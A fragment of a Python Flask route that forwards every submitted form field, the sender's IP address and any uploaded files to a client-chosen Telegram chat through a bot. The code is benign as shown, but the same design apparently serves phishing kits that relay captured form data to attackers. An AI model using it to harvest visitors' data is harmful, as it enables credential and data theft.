import mimetypes

@app.route("/send", methods=["POST"])
def send():
    chat_id = request.form.get("chat_id")

    if not chat_id:
        return jsonify({"ok": False, "error": "chat_id missing"}), 400

    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    text_lines = [
        "📱 New Submission",
        f"IP Address: {user_ip}",
        ""
    ]

    for key in request.form:
        if key != "chat_id":
            text_lines.append(f"{key}: {request.form.get(key)}")

    # ✅ SEND TEXT
    msg_res = requests.post(
        f"{TG_API}/sendMessage",
        json={
            "chat_id": chat_id,
            "text": "\n".join(text_lines),
            "parse_mode": "Markdown"
        }
    )

    if not msg_res.ok or not msg_res.json().get("ok"):
        return jsonify({"ok": False, "error": "Message failed"}), 500

    # ✅ SEND FILES
    for file_key in request.files:
        file = request.files[file_key]

        if file.filename:
            mime_type, _ = mimetypes.guess_type(file.filename)

            try:
                if mime_type and mime_type.startswith("image"):
                    # 📸 SEND AS PHOTO
                    res = requests.post(
                        f"{TG_API}/sendPhoto",
                        data={"chat_id": chat_id},
                        files={"photo": (file.filename, file.stream)}
                    )
                else:
                    # 📎 SEND AS DOCUMENT
                    res = requests.post(
                        f"{TG_API}/sendDocument",
                        data={"chat_id": chat_id},
                        files={"document": (file.filename, file.stream)}
                    )

                if not res.ok or not res.json().get("ok"):
                    return jsonify({"ok": False, "error": "File upload failed"}), 500

            except Exception as e:
                return jsonify({"ok": False, "error": str(e)}), 500

    return jsonify({"ok": True})